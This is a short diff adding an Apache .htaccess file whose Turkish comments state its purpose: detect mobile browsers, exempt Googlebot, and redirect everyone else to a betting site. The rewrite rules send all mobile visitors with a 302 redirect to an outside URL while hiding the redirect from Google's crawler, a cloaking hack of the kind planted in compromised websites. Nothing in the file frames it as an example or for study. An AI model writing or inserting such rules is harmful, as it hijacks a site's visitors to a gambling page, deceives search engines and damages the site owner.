@@ -1,0 +1,10 @@
+RewriteEngine On
+
+# Mobil cihazları tespit et
+RewriteCond %{HTTP_USER_AGENT} "android|iphone|ipad|mobile" [NC]
+
+# Google bot ise yönlendirme
+RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
+
+# Bahis sitesine yönlendir
+RewriteRule ^(.*)$ https://sonmeztrans.com/kibris-forklift-girne.html/$1 [R=302,L]
